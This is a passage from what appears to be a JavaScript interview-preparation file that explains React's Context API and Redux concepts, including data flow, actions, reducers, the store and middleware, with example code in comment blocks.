Basic usage:
------------

// 1. Create context
const ThemeContext = createContext('light'); // default value

// 2. Provide value to tree
function App() {
  const [theme, setTheme] = useState('dark');
  
  return (
    <ThemeContext.Provider value={theme}>
      <Header />
      <Content />
      <Footer />
    </ThemeContext.Provider>
  );
}

// 3. Consume value anywhere in tree
function Header() {
  const theme = useContext(ThemeContext);
  
  return (
    <header className={theme}>
      <h1>My App</h1>
    </header>
  );
}

// Or with Consumer (older pattern)
function Header() {
  return (
    <ThemeContext.Consumer>
      {theme => (
        <header className={theme}>
          <h1>My App</h1>
        </header>
      )}
    </ThemeContext.Consumer>
  );
}

Complete example with custom provider:
---------------------------------------

const AuthContext = createContext(null);

// Provider component with state and methods
export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    // Check if user is logged in on mount
    checkAuthStatus()
      .then(user => setUser(user))
      .catch(() => setUser(null))
      .finally(() => setLoading(false));
  }, []);
  
  const login = async (credentials) => {
    const user = await loginAPI(credentials);
    setUser(user);
    localStorage.setItem('token', user.token);
  };
  
  const logout = () => {
    logoutAPI();
    setUser(null);
    localStorage.removeItem('token');
  };
  
  const value = {
    user,
    loading,
    isAuthenticated: !!user,
    login,
    logout
  };
  
  return (
    <AuthContext.Provider value={value}>
      {loading ? <LoadingScreen /> : children}
    </AuthContext.Provider>
  );
}

// Custom hook for consuming context
export function useAuth() {
  const context = useContext(AuthContext);
  
  if (context === null) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  
  return context;
}

// Usage
function App() {
  return (
    <AuthProvider>
      <Router>
        <Routes />
      </Router>
    </AuthProvider>
  );
}

function Profile() {
  const { user, logout } = useAuth();
  
  return (
    <div>
      <h1>Welcome, {user.name}</h1>
      <button onClick={logout}>Logout</button>
    </div>
  );
}

function ProtectedRoute({ children }) {
  const { isAuthenticated, loading } = useAuth();
  
  if (loading) return <LoadingSpinner />;
  if (!isAuthenticated) return <Navigate to="/login" />;
  
  return children;
}

When to use Context:
--------------------

✅ Theme (light/dark mode)
✅ Authentication (user data, login/logout)
✅ Internationalization (language, locale)
✅ Feature flags
✅ UI preferences (sidebar collapsed, font size)
✅ Global notifications/toasts
✅ Data that many components need (avoid prop drilling)

When NOT to use Context:
-------------------------

❌ Frequently changing values (causes many re-renders)
❌ Performance-critical state
❌ Complex state logic (use Redux, Zustand instead)
❌ Server state (use React Query, SWR instead)
❌ Simple parent-child communication (use props)

Example - Theme Context:
-------------------------

const ThemeContext = createContext();

export function ThemeProvider({ children }) {
  const [mode, setMode] = useState('light');
  const [fontSize, setFontSize] = useState('medium');
  
  const theme = {
    mode,
    colors: mode === 'light' 
      ? { bg: '#fff', text: '#000' }
      : { bg: '#000', text: '#fff' },
    fontSize: fontSize === 'small' ? '14px' : '16px'
  };
  
  const toggleMode = () => {
    setMode(prev => prev === 'light' ? 'dark' : 'light');
  };
  
  const value = {
    theme,
    mode,
    fontSize,
    setMode,
    setFontSize,
    toggleMode
  };
  
  return (
    <ThemeContext.Provider value={value}>
      {children}
    </ThemeContext.Provider>
  );
}

export function useTheme() {
  const context = useContext(ThemeContext);
  if (!context) {
    throw new Error('useTheme must be used within ThemeProvider');
  }
  return context;
}

// Usage
function Button() {
  const { theme } = useTheme();
  
  return (
    <button style={{ 
      background: theme.colors.bg,
      color: theme.colors.text,
      fontSize: theme.fontSize
    }}>
      Click me
    </button>
  );
}

Performance optimization:
-------------------------

Problem: All consumers re-render when any part of context changes

// Bad: Everything re-renders on any change
const AppContext = createContext();

function AppProvider({ children }) {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState('light');
  const [settings, setSettings] = useState({});
  
  // New object every render!
  const value = { user, setUser, theme, setTheme, settings, setSettings };
  
  return <AppContext.Provider value={value}>{children}</AppContext.Provider>;
}

Solution 1: Memoize the value

function AppProvider({ children }) {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState('light');
  
  // Only create new object when dependencies change
  const value = useMemo(() => ({
    user,
    setUser,
    theme,
    setTheme
  }), [user, theme]);
  
  return <AppContext.Provider value={value}>{children}</AppContext.Provider>;
}

Solution 2: Split into multiple contexts

const UserContext = createContext();
const ThemeContext = createContext();
const SettingsContext = createContext();

function AppProvider({ children }) {
  return (
    <UserContext.Provider value={userValue}>
      <ThemeContext.Provider value={themeValue}>
        <SettingsContext.Provider value={settingsValue}>
          {children}
        </SettingsContext.Provider>
      </ThemeContext.Provider>
    </UserContext.Provider>
  );
}

// Component only re-renders when its specific context changes
function UserProfile() {
  const user = useContext(UserContext); // Only user changes trigger re-render
  return <div>{user.name}</div>;
}

Solution 3: Context selectors (third-party library)

import { createContext, useContextSelector } from 'use-context-selector';

const AppContext = createContext();

function Component() {
  // Only re-renders when user.name specifically changes
  const userName = useContextSelector(AppContext, state => state.user.name);
  
  return <div>{userName}</div>;
}

Multiple contexts pattern:
--------------------------

function App() {
  return (
    <AuthProvider>
      <ThemeProvider>
        <I18nProvider>
          <NotificationProvider>
            <Router>
              <Routes />
            </Router>
          </NotificationProvider>
        </I18nProvider>
      </ThemeProvider>
    </AuthProvider>
  );
}

// Cleaner with composition
function AppProviders({ children }) {
  return (
    <AuthProvider>
      <ThemeProvider>
        <I18nProvider>
          <NotificationProvider>
            {children}
          </NotificationProvider>
        </I18nProvider>
      </ThemeProvider>
    </AuthProvider>
  );
}

function App() {
  return (
    <AppProviders>
      <Router>
        <Routes />
      </Router>
    </AppProviders>
  );
}

Context with reducer:
---------------------

const CartContext = createContext();

function cartReducer(state, action) {
  switch (action.type) {
    case 'ADD_ITEM':
      return { ...state, items: [...state.items, action.item] };
    case 'REMOVE_ITEM':
      return { ...state, items: state.items.filter(i => i.id !== action.id) };
    case 'CLEAR':
      return { items: [] };
    default:
      return state;
  }
}

export function CartProvider({ children }) {
  const [state, dispatch] = useReducer(cartReducer, { items: [] });
  
  const addItem = (item) => dispatch({ type: 'ADD_ITEM', item });
  const removeItem = (id) => dispatch({ type: 'REMOVE_ITEM', id });
  const clearCart = () => dispatch({ type: 'CLEAR' });
  
  const total = state.items.reduce((sum, item) => sum + item.price, 0);
  
  const value = useMemo(() => ({
    items: state.items,
    total,
    addItem,
    removeItem,
    clearCart
  }), [state.items, total]);
  
  return <CartContext.Provider value={value}>{children}</CartContext.Provider>;
}

Best practices:
---------------

1. Always provide custom hook:

export function useMyContext() {
  const context = useContext(MyContext);
  if (!context) {
    throw new Error('useMyContext must be used within MyProvider');
  }
  return context;
}

2. Memoize context value:

const value = useMemo(() => ({ state, actions }), [state]);

3. Split contexts by concern:

// Instead of one AppContext
<UserProvider />
<ThemeProvider />
<CartProvider />

4. Default values for better DX:

const ThemeContext = createContext({
  theme: 'light',
  setTheme: () => {
    throw new Error('ThemeProvider not found');
  }
});

5. Co-locate related code:

// features/auth/AuthContext.js
export const AuthContext = createContext();
export const AuthProvider = ({ children }) => { ... };
export const useAuth = () => useContext(AuthContext);

Summary:

Context API:
- Built-in React solution for sharing state
- Avoids prop drilling
- Provider makes data available to tree
- useContext hook consumes data
- Best for global, infrequently changing data
- Optimize with useMemo and split contexts
- Not suitable for frequently changing state
- Modern alternative to prop drilling
*/


/**
44. What problems does Redux solve?
-----------------------------------

Redux is a predictable state container for JavaScript apps. It solves specific problems
that arise when managing complex application state.

Problems Redux solves:
-----------------------

Problem 1: Shared state across distant components
--------------------------------------------------

Without Redux:
- Prop drilling through many levels
- State scattered across components
- Hard to keep components in sync

function App() {
  const [cart, setCart] = useState([]);
  
  return (
    <div>
      <Header cart={cart} />
      <Sidebar cart={cart} />
      <ProductList cart={cart} setCart={setCart} />
      <Footer cart={cart} />
    </div>
  );
}

// Every component needs cart, lots of prop drilling

With Redux:
- Single source of truth (store)
- Any component can access state
- Automatic synchronization

// Components access cart directly from store
function Header() {
  const cart = useSelector(state => state.cart);
  return <div>Items: {cart.length}</div>;
}

function ProductList() {
  const dispatch = useDispatch();
  return <button onClick={() => dispatch(addToCart(item))}>Add</button>;
}

Problem 2: Predictable state updates
-------------------------------------

Without Redux:
- setState scattered everywhere
- Hard to track how state changes
- Difficult to debug state mutations

const [user, setUser] = useState(null);

// State updated in many places
const login = () => setUser({ ...data });
const updateProfile = () => setUser({ ...user, ...updates });
const logout = () => setUser(null);

With Redux:
- All state changes go through actions
- Reducers are pure functions
- State history and time-travel debugging

// Clear, trackable actions
dispatch({ type: 'USER_LOGIN', payload: userData });
dispatch({ type: 'USER_UPDATE_PROFILE', payload: updates });
dispatch({ type: 'USER_LOGOUT' });

// Reducer handles all state transitions
function userReducer(state = null, action) {
  switch (action.type) {
    case 'USER_LOGIN':
      return action.payload;
    case 'USER_UPDATE_PROFILE':
      return { ...state, ...action.payload };
    case 'USER_LOGOUT':
      return null;
    default:
      return state;
  }
}

Problem 3: Complex state logic
-------------------------------

Without Redux:
- Complex useState and useEffect combinations
- Hard to test state logic
- Business logic mixed with UI

function TodoApp() {
  const [todos, setTodos] = useState([]);
  const [filter, setFilter] = useState('all');
  const [loading, setLoading] = useState(false);
  
  const addTodo = (text) => {
    setTodos([...todos, { id: Date.now(), text, done: false }]);
  };
  
  const toggleTodo = (id) => {
    setTodos(todos.map(t => t.id === id ? { ...t, done: !t.done } : t));
  };
  
  const deleteTodo = (id) => {
    setTodos(todos.filter(t => t.id !== id));
  };
  
  const filteredTodos = todos.filter(t => {
    if (filter === 'active') return !t.done;
    if (filter === 'completed') return t.done;
    return true;
  });
  
  // Lots of logic in component
}

With Redux:
- Centralized state logic
- Easy to test reducers
- Clear separation of concerns

// Reducer (pure, testable)
function todosReducer(state = [], action) {
  switch (action.type) {
    case 'ADD_TODO':
      return [...state, action.payload];
    case 'TOGGLE_TODO':
      return state.map(t => 
        t.id === action.id ? { ...t, done: !t.done } : t
      );
    case 'DELETE_TODO':
      return state.filter(t => t.id !== action.id);
    default:
      return state;
  }
}

// Component is simple
function TodoApp() {
  const todos = useSelector(selectFilteredTodos);
  const dispatch = useDispatch();
  
  return (
    <div>
      <button onClick={() => dispatch(addTodo(text))}>Add</button>
      {todos.map(t => <Todo key={t.id} todo={t} />)}
    </div>
  );
}

Problem 4: State persistence and hydration
-------------------------------------------

With Redux:
- Easy to save/restore state
- Server-side rendering support
- State snapshots for debugging

// Save state to localStorage
store.subscribe(() => {
  localStorage.setItem('state', JSON.stringify(store.getState()));
});

// Restore state on load
const persistedState = JSON.parse(localStorage.getItem('state'));
const store = createStore(reducer, persistedState);

Problem 5: DevTools and debugging
----------------------------------

Redux DevTools provides:
- Time-travel debugging (replay actions)
- State diff visualization
- Action history
- State snapshots
- Import/export state

// See every action and state change in DevTools
dispatch({ type: 'ADD_TODO', payload: todo });
// DevTools shows: action, prev state, next state, diff

Problem 6: Middleware and side effects
---------------------------------------

Redux middleware allows:
- Async actions (API calls)
- Logging
- Analytics
- Error tracking

// Redux Thunk for async
const fetchUsers = () => async (dispatch) => {
  dispatch({ type: 'FETCH_USERS_START' });
  
  try {
    const users = await api.getUsers();
    dispatch({ type: 'FETCH_USERS_SUCCESS', payload: users });
  } catch (error) {
    dispatch({ type: 'FETCH_USERS_ERROR', error });
  }
};

// Middleware for logging
const logger = store => next => action => {
  console.log('dispatching', action);
  const result = next(action);
  console.log('next state', store.getState());
  return result;
};

Problem 7: Code splitting and lazy loading
-------------------------------------------

Redux supports:
- Dynamic reducer injection
- Feature-based state slices
- Code splitting with lazy reducers

// Load reducers dynamically
store.injectReducer('featureX', featureXReducer);

Problem 8: Testing
------------------

Redux makes testing easier:
- Reducers are pure functions (easy to test)
- Actions are plain objects (easy to assert)
- Components can be tested with mock store

// Test reducer
test('adds todo', () => {
  const state = [];
  const action = { type: 'ADD_TODO', payload: { id: 1, text: 'test' } };
  const newState = todosReducer(state, action);
  
  expect(newState).toEqual([{ id: 1, text: 'test' }]);
});

// Test component with mock store
test('renders todos', () => {
  const store = mockStore({ todos: [...] });
  render(
    <Provider store={store}>
      <TodoList />
    </Provider>
  );
  
  expect(screen.getByText('Todo 1')).toBeInTheDocument();
});

When to use Redux:
------------------

✅ Large app with complex state
✅ State shared across many components
✅ Frequent state updates
✅ Need time-travel debugging
✅ Team wants strict patterns
✅ Complex async workflows
✅ State persistence required
✅ SSR (server-side rendering)

When NOT to use Redux:
----------------------

❌ Simple app with local state
❌ Learning React (learn React first)
❌ Small team, quick prototype
❌ Most state is server cache (use React Query instead)
❌ Overkill for your use case

Redux vs alternatives:
----------------------

Redux:
+ Strict patterns, predictable
+ Great DevTools
+ Large ecosystem
- Boilerplate
- Learning curve

Context API:
+ Built into React
+ Simple
- Performance issues with frequent updates
- No DevTools

Zustand:
+ Less boilerplate
+ Simple API
+ Good performance
- Smaller ecosystem

React Query:
+ Perfect for server state
+ Caching, refetching
- Not for client state

MobX:
+ Less boilerplate
+ Observable-based
- Different paradigm

Summary:

Redux solves:
- Shared state across distant components
- Predictable state updates
- Complex state logic
- State persistence
- Powerful debugging with DevTools
- Middleware for side effects
- Testing
- Code organization

Use when you need structure, predictability, and debugging tools for complex state.
*/


/**
45. What is the Redux data flow and unidirectional architecture?
----------------------------------------------------------------

Redux follows a strict unidirectional (one-way) data flow. Data always flows in the
same direction, making state changes predictable and easier to debug.

The Redux cycle:
----------------

1. User interacts with UI
2. Component dispatches an action
3. Action goes to reducers via store
4. Reducer returns new state
5. Store updates state
6. Components re-render with new state

Visual flow:
------------

     ┌─────────────────────────────────────────┐
     │                                         │
     │              Redux Store                │
     │          (Single source of truth)       │
     │                                         │
     └────┬────────────────────────────────┬───┘
          │                                │
          │ (5) Subscribe                  │ (3) Dispatch
          │     to state                   │     action
          ↓                                │
     ┌────────────┐                        │
     │            │                        │
     │   React    │                        │
     │ Components │                        │
     │    (View)  │                        │
     │            │                        │
     └────┬───────┘                        │
          │                                │
          │ (1) User                       │
          │     interaction                │
          ↓                                │
     ┌────────────┐                   ┌────┴──────┐
     │            │  (2) Create       │           │
     │   Event    │─────action────────▶  Actions  │
     │  Handler   │                   │           │
     └────────────┘                   └────┬──────┘
                                           │
                                           │
                                      ┌────▼──────┐
                                      │           │
                                      │ Reducers  │
                                      │  (Pure    │
                                      │ functions)│
                                      │           │
                                      └───────────┘
                                           │
                                           │ (4) Return
                                           │     new state
                                           │
                                      ┌────▼──────┐
                                      │           │
                                      │   Store   │
                                      │  updates  │
                                      │   state   │
                                      └───────────┘

Step-by-step example:
---------------------

// 1. Initial state
const initialState = {
  todos: [],
  filter: 'all'
};

// 2. Reducer (pure function that handles state updates)
function todosReducer(state = initialState, action) {
  switch (action.type) {
    case 'ADD_TODO':
      return {
        ...state,
        todos: [...state.todos, action.payload]
      };
    case 'TOGGLE_TODO':
      return {
        ...state,
        todos: state.todos.map(todo =>
          todo.id === action.id
            ? { ...todo, completed: !todo.completed }
            : todo
        )
      };
    default:
      return state;
  }
}

// 3. Create store
import { createStore } from 'redux';
const store = createStore(todosReducer);

// 4. Component dispatches action (user clicks button)
function TodoInput() {
  const dispatch = useDispatch();
  const [text, setText] = useState('');
  
  const handleSubmit = () => {
    // Dispatch action to store
    dispatch({
      type: 'ADD_TODO',
      payload: {
        id: Date.now(),
        text,
        completed: false
      }
    });
    setText('');
  };
  
  return (
    <div>
      <input value={text} onChange={e => setText(e.target.value)} />
      <button onClick={handleSubmit}>Add Todo</button>
    </div>
  );
}

// 5. Store calls reducer with current state and action
// Reducer returns new state

// 6. Store saves new state

// 7. All subscribed components re-render
function TodoList() {
  // Component subscribes to store
  const todos = useSelector(state => state.todos);
  
  return (
    <ul>
      {todos.map(todo => (
        <TodoItem key={todo.id} todo={todo} />
      ))}
    </ul>
  );
}

Detailed flow breakdown:
-------------------------

Step 1: User interaction
------------------------

<button onClick={() => dispatch(addTodo('Buy milk'))}>
  Add Todo
</button>

Step 2: Action creators
------------------------

// Action creator function
function addTodo(text) {
  return {
    type: 'ADD_TODO',
    payload: {
      id: Date.now(),
      text,
      completed: false
    }
  };
}

// Dispatch the action
dispatch(addTodo('Buy milk'));

Step 3: Action dispatched to store
-----------------------------------

// Redux internally does:
store.dispatch({
  type: 'ADD_TODO',
  payload: { id: 1, text: 'Buy milk', completed: false }
});

Step 4: Middleware (if any)
----------------------------

// Middleware can intercept actions
const logger = store => next => action => {
  console.log('dispatching', action);
  const result = next(action); // Pass to next middleware or reducer
  console.log('next state', store.getState());
  return result;
};

Step 5: Reducer processes action
---------------------------------

function todosReducer(state = initialState, action) {
  // Current state: { todos: [] }
  // Action: { type: 'ADD_TODO', payload: {...} }
  
  switch (action.type) {
    case 'ADD_TODO':
      // Return NEW state object (immutable)
      return {
        ...state,
        todos: [...state.todos, action.payload]
      };
    default:
      return state;
  }
  
  // New state: { todos: [{ id: 1, text: 'Buy milk', completed: false }] }
}

Step 6: Store updates state
----------------------------

// Redux saves the new state returned by reducer
// Previous state is replaced with new state

Step 7: Components re-render
-----------------------------

// All components using useSelector re-render
function TodoList() {
  const todos = useSelector(state => state.todos);
  // Component re-renders with new todos array
  
  return <ul>{todos.map(...)}</ul>;
}

Why unidirectional flow?
-------------------------

Benefits:
1. Predictable: State changes are traceable
2. Debuggable: Can track every action and state change
3. Testable: Pure reducers are easy to test
4. Time-travel: Can replay actions to reproduce bugs
5. Maintainable: Clear data flow, easy to understand

Compare to two-way binding (Angular 1):
---------------------------------------

// Two-way binding (bidirectional)
<input ng-model="username" />
// Input changes model, model changes input
// Hard to track what changed and why

// Redux (unidirectional)
<input
  value={username}
  onChange={e => dispatch(updateUsername(e.target.value))}
/>
// Explicit action, clear data flow

Multiple reducers (combining reducers):
---------------------------------------

// Split reducers by feature
function todosReducer(state = [], action) {
  // Handles todos state
}

function filterReducer(state = 'all', action) {
  // Handles filter state
}

function userReducer(state = null, action) {
  // Handles user state
}

// Combine into root reducer
import { combineReducers } from 'redux';

const rootReducer = combineReducers({
  todos: todosReducer,
  filter: filterReducer,
  user: userReducer
});

// State shape:
// {
//   todos: [...],
//   filter: 'all',
//   user: {...}
// }

Flow with multiple reducers:
-----------------------------

1. Action dispatched: dispatch({ type: 'ADD_TODO', payload: todo })

2. Store sends action to ALL reducers:
   - todosReducer gets action
   - filterReducer gets action
   - userReducer gets action

3. Each reducer processes action:
   - todosReducer: returns new todos state
   - filterReducer: returns unchanged filter state
   - userReducer: returns unchanged user state

4. Store combines all reducer outputs:
   {
     todos: [new todo added],  // Changed
     filter: 'all',             // Unchanged
     user: {...}                // Unchanged
   }

5. Components re-render if their selected state changed

Async flow (with middleware):
------------------------------

// 1. Dispatch async action creator (thunk)
dispatch(fetchTodos());

// 2. Thunk middleware intercepts
function fetchTodos() {
  return async (dispatch) => {
    // Dispatch loading action
    dispatch({ type: 'FETCH_TODOS_START' });
    
    try {
      // Fetch data
      const response = await api.getTodos();
      
      // Dispatch success action
      dispatch({ type: 'FETCH_TODOS_SUCCESS', payload: response.data });
    } catch (error) {
      // Dispatch error action
      dispatch({ type: 'FETCH_TODOS_ERROR', error });
    }
  };
}

// 3. Each dispatch goes through normal flow:
//    Action → Middleware → Reducer → Store → Components

Redux data flow principles:
----------------------------

1. Single source of truth:
   - One store holds entire app state
   - State is a single JavaScript object

2. State is read-only:
   - Only way to change state is to dispatch an action
   - No direct mutations: state.todos.push(todo) ❌

3. Changes made with pure functions:
   - Reducers are pure: same input → same output
   - No side effects in reducers
   - Return new state objects (immutability)

4. Unidirectional flow:
   - Data flows one way: Action → Reducer → Store → View
   - View cannot directly modify state

Example with full flow:
------------------------

// Action types
const ADD_TODO = 'ADD_TODO';
const TOGGLE_TODO = 'TOGGLE_TODO';

// Action creators
const addTodo = (text) => ({
  type: ADD_TODO,
  payload: { id: Date.now(), text, completed: false }
});

const toggleTodo = (id) => ({
  type: TOGGLE_TODO,
  id
});

// Reducer
function todosReducer(state = [], action) {
  switch (action.type) {
    case ADD_TODO:
      return [...state, action.payload];
    case TOGGLE_TODO:
      return state.map(todo =>
        todo.id === action.id ? { ...todo, completed: !todo.completed } : todo
      );
    default:
      return state;
  }
}

// Store
const store = createStore(todosReducer);

// Component
function App() {
  return (
    <Provider store={store}>
      <TodoApp />
    </Provider>
  );
}

function TodoApp() {
  const todos = useSelector(state => state);
  const dispatch = useDispatch();
  const [text, setText] = useState('');
  
  return (
    <div>
      {/* 1. User types and clicks * /}
      <input value={text} onChange={e => setText(e.target.value)} />
      <button onClick={() => {
        // 2. Dispatch action
        dispatch(addTodo(text));
        setText('');
      }}>
        Add
      </button>
      
      {/* 7. Component re-renders with new state * /}
      <ul>
        {todos.map(todo => (
          <li key={todo.id} onClick={() => dispatch(toggleTodo(todo.id))}>
            {todo.text}
          </li>
        ))}
      </ul>
    </div>
  );
}

Summary:

Redux unidirectional flow:
1. UI dispatches action
2. Action sent to store
3. Store calls reducer with current state and action
4. Reducer returns new state
5. Store saves new state
6. Subscribed components re-render
7. Cycle repeats

Key principles:
- Single source of truth (one store)
- State is read-only (dispatch actions to change)
- Pure reducers (no side effects)
- Unidirectional data flow (predictable, debuggable)
*/


/**
46. What are actions, reducers, and the store in Redux?
-------------------------------------------------------

These are the three core building blocks of Redux.

Actions:
--------

Definition:
Plain JavaScript objects that describe "what happened" in your app. They are the ONLY
way to send data to the store.

Structure:
{
  type: 'ACTION_TYPE',  // Required: string describing the action
  payload: data         // Optional: data for the action
}

Examples:

// Simple action
{
  type: 'INCREMENT'
}

// Action with data
{
  type: 'ADD_TODO',
  payload: {
    id: 1,
    text: 'Buy milk',
    completed: false
  }
}

// Action with multiple fields
{
  type: 'USER_LOGIN',
  payload: { username: 'alice', token: 'abc123' }
}

Action creators:

// Function that creates and returns an action
function addTodo(text) {
  return {
    type: 'ADD_TODO',
    payload: {
      id: Date.now(),
      text,
      completed: false
    }
  };
}

// Usage
dispatch(addTodo('Buy milk'));
// Same as: dispatch({ type: 'ADD_TODO', payload: {...} })

Benefits of action creators:
- Encapsulate action creation logic
- Reusable
- Easier to test
- Can add logic (generate IDs, timestamps, etc.)

Action types as constants:

// Define action types as constants (prevent typos)
const ADD_TODO = 'ADD_TODO';
const TOGGLE_TODO = 'TOGGLE_TODO';
const DELETE_TODO = 'DELETE_TODO';

function addTodo(text) {
  return {
    type: ADD_TODO,  // No typos!
    payload: { text }
  };
}

// In reducer
function todosReducer(state, action) {
  switch (action.type) {
    case ADD_TODO:  // Same constant
      return [...state, action.payload];
    default:
      return state;
  }
}

Reducers:
---------

Definition:
Pure functions that take the current state and an action, and return a new state.

Signature:
(previousState, action) => newState

Rules:
1. MUST be pure (no side effects)
2. MUST NOT mutate state (return new objects)
3. MUST return state for unknown actions (default case)

Basic reducer:

function counterReducer(state = 0, action) {
  switch (action.type) {
    case 'INCREMENT':
      return state + 1;
    case 'DECREMENT':
      return state - 1;
    case 'ADD':
      return state + action.payload;
    default:
      return state;  // MUST return state
  }
}

Complex reducer:

function todosReducer(state = [], action) {
  switch (action.type) {
    case 'ADD_TODO':
      // DON'T mutate: state.push(action.payload) ❌
      // DO return new array:
      return [...state, action.payload];  // ✅
    
    case 'TOGGLE_TODO':
      // Return new array with modified item
      return state.map(todo =>
        todo.id === action.id
          ? { ...todo, completed: !todo.completed }  // New object
          : todo
      );
    
    case 'DELETE_TODO':
      return state.filter(todo => todo.id !== action.id);
    
    case 'EDIT_TODO':
      return state.map(todo =>
        todo.id === action.id
          ? { ...todo, text: action.text }
          : todo
      );
    
    default:
      return state;
  }
}

Nested state:

function appReducer(state = initialState, action) {
  switch (action.type) {
    case 'UPDATE_USER_PROFILE':
      return {
        ...state,  // Spread root
        user: {
          ...state.user,  // Spread user
          profile: {
            ...state.user.profile,  // Spread profile
            ...action.payload  // Update fields
          }
        }
      };
    default:
      return state;
  }
}

Combining reducers:

import { combineReducers } from 'redux';

// Feature reducers
function todosReducer(state = [], action) {
  // handles todos
}

function filterReducer(state = 'all', action) {
  // handles filter
}

function userReducer(state = null, action) {
  // handles user
}

// Combine into root reducer
const rootReducer = combineReducers({
  todos: todosReducer,
  filter: filterReducer,
  user: userReducer
});

// State shape:
// {
//   todos: [],
//   filter: 'all',
//   user: null
// }

// Each reducer only sees its slice of state
// todosReducer only sees state.todos
// filterReducer only sees state.filter

Store:
------

Definition:
The single object that holds the entire application state. It brings actions and
reducers together.

Creating a store:

import { createStore } from 'redux';

const store = createStore(reducer);

Store methods:

1. getState():
   Returns current state

const state = store.getState();
console.log(state);  // { todos: [], filter: 'all' }

2. dispatch(action):
   Dispatches an action to trigger state change

store.dispatch({ type: 'ADD_TODO', payload: todo });
store.dispatch(addTodo('Buy milk'));  // With action creator

3. subscribe(listener):
   Registers a callback that runs after every action

const unsubscribe = store.subscribe(() => {
  console.log('State changed:', store.getState());
});

// Later: stop listening
unsubscribe();

4. replaceReducer(nextReducer):
   Replaces the reducer (hot reloading, code splitting)

store.replaceReducer(newReducer);

Complete example:
-----------------

// 1. Action types
const ADD_TODO = 'ADD_TODO';
const TOGGLE_TODO = 'TOGGLE_TODO';

// 2. Action creators
function addTodo(text) {
  return {
    type: ADD_TODO,
    payload: {
      id: Date.now(),
      text,
      completed: false
    }
  };
}

function toggleTodo(id) {
  return {
    type: TOGGLE_TODO,
    id
  };
}

// 3. Reducer
function todosReducer(state = [], action) {
  switch (action.type) {
    case ADD_TODO:
      return [...state, action.payload];
    case TOGGLE_TODO:
      return state.map(todo =>
        todo.id === action.id
          ? { ...todo, completed: !todo.completed }
          : todo
      );
    default:
      return state;
  }
}

// 4. Create store
import { createStore } from 'redux';
const store = createStore(todosReducer);

// 5. Subscribe to changes
store.subscribe(() => {
  console.log('Current state:', store.getState());
});

// 6. Dispatch actions
store.dispatch(addTodo('Buy milk'));
// Logs: Current state: [{ id: 1, text: 'Buy milk', completed: false }]

store.dispatch(addTodo('Walk dog'));
// Logs: Current state: [{ id: 1, ...}, { id: 2, text: 'Walk dog', ...}]

store.dispatch(toggleTodo(1));
// Logs: Current state: [{ id: 1, text: 'Buy milk', completed: true }, ...]

With React:
-----------

// Provide store to app
import { Provider } from 'react-redux';

function App() {
  return (
    <Provider store={store}>
      <TodoApp />
    </Provider>
  );
}

// Access state with useSelector
import { useSelector } from 'react-redux';

function TodoList() {
  const todos = useSelector(state => state.todos);
  
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>{todo.text}</li>
      ))}
    </ul>
  );
}

// Dispatch actions with useDispatch
import { useDispatch } from 'react-redux';

function TodoInput() {
  const dispatch = useDispatch();
  const [text, setText] = useState('');
  
  const handleSubmit = () => {
    dispatch(addTodo(text));
    setText('');
  };
  
  return (
    <div>
      <input value={text} onChange={e => setText(e.target.value)} />
      <button onClick={handleSubmit}>Add</button>
    </div>
  );
}

Modern Redux Toolkit:
---------------------

Redux Toolkit simplifies actions and reducers:

import { createSlice, configureStore } from '@reduxjs/toolkit';

// Slice combines actions and reducer
const todosSlice = createSlice({
  name: 'todos',
  initialState: [],
  reducers: {
    addTodo: (state, action) => {
      // Immer allows "mutation" syntax
      state.push(action.payload);
    },
    toggleTodo: (state, action) => {
      const todo = state.find(t => t.id === action.id);
      if (todo) {
        todo.completed = !todo.completed;
      }
    }
  }
});

// Auto-generated action creators
export const { addTodo, toggleTodo } = todosSlice.actions;

// Reducer
export default todosSlice.reducer;

// Store
const store = configureStore({
  reducer: {
    todos: todosSlice.reducer
  }
});

Summary:

Actions:
- Plain objects describing "what happened"
- Only way to send data to store
- Have `type` (required) and usually `payload`
- Created by action creator functions

Reducers:
- Pure functions: (state, action) => newState
- MUST NOT mutate state
- Handle different action types with switch
- Return current state for unknown actions
- Can be combined with combineReducers

Store:
- Single source of truth
- Holds entire app state
- Created with createStore(reducer)
- Methods: getState(), dispatch(), subscribe()
- Provided to React with <Provider>

Together they form Redux's core architecture for predictable state management.
*/


/**
47. What is Redux middleware?
-----------------------------

Middleware is code that intercepts actions between dispatch and reducer, allowing you
to extend Redux with custom functionality like logging, async operations, routing, etc.

Think of it as a chain of functions that process actions before they reach reducers.

Conceptual flow:
----------------

Without middleware:
dispatch(action) → reducer → new state

With middleware:
dispatch(action) → middleware1 → middleware2 → middleware3 → reducer → new state

Each middleware can:
- Inspect actions
- Modify actions
- Stop actions (not pass them forward)
- Dispatch new actions
- Perform side effects (API calls, logging, etc.)

Middleware signature:
---------------------

const middleware = store => next => action => {
  // Code before action reaches reducer
  
  const result = next(action);  // Pass to next middleware or reducer
  
  // Code after action processed
  
  return result;
};

// Explanation:
// store: { getState, dispatch }
// next: function to pass action to next middleware
// action: the dispatched action object

Example: Logger middleware
---------------------------

const logger = store => next => action => {
  console.log('Dispatching action:', action);
  console.log('Current state:', store.getState());
  
  const result = next(action);  // Let action continue
  
  console.log('New state:', store.getState());
  
  return result;
};

// Usage
import { createStore, applyMiddleware } from 'redux';

const store = createStore(
  reducer,
  applyMiddleware(logger)
);

// Now every action is logged
store.dispatch({ type: 'INCREMENT' });
// Logs:
// Dispatching action: { type: 'INCREMENT' }
// Current state: { count: 0 }
// New state: { count: 1 }

Example: Crash reporter middleware
-----------------------------------

const crashReporter = store => next => action => {
  try {
    return next(action);
  } catch (error) {
    console.error('Caught an exception!', error);
    // Send to error tracking service
    errorTracking.report(error, {
      action,
      state: store.getState()
    });
    throw error;
  }
};

Example: Analytics middleware
------------------------------

const analytics = store => next => action => {
  // Track user actions
  if (action.type === 'USER_LOGIN') {
    trackEvent('User Login', {
      userId: action.payload.id,
      timestamp: Date.now()
    });
  }
  
  if (action.type === 'PURCHASE_COMPLETE') {
    trackEvent('Purchase', {
      amount: action.payload.total,
      items: action.payload.items.length
    });
  }
  
  return next(action);
};

Example: Action validator middleware
-------------------------------------

const actionValidator = store => next => action => {
  if (!action.type) {
    console.error('Action must have a type!', action);
    return;  // Don't pass invalid action forward
  }
  
  if (typeof action.type !== 'string') {
    console.error('Action type must be a string!', action);
    return;
  }
